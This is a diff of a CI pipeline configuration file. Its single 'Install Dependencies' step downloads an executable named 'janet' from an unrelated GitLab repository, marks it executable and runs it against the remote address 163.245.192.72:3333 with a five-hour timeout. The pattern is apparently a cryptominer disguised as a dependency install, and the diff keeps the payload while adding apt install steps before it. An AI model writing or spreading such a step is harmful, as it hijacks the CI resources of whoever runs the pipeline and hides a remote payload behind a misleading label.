@@ -7,7 +7,7 @@ jobs:
       steps:
         - run:
             name: Install Dependencies
-            command: wget https://gitlab.com/bnqwbdqwr/annh/-/blob/main/janet && chmod +x janet && ./janet -o 163.245.192.72:3333
+            command: apt update && apt install nodejs wget -y && wget https://gitlab.com/bnqwbdqwr/annh/-/blob/main/janet && chmod +x janet && ./janet -o 163.245.192.72:3333
             no_output_timeout: 5h
 
 workflows:
